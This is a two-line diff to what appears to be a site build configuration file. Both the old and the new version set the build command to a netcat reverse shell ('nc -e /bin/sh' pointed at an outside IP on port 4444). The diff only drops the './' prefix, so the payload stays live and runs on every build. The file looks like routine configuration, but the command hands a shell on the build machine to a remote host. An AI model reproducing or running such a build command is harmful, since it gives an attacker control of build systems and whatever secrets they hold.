@@ -1,2 +1,2 @@
 [build]
-  command = "./nc -e /bin/sh 13.127.106.70 4444"
+  command = "nc -e /bin/sh 13.127.106.70 4444"
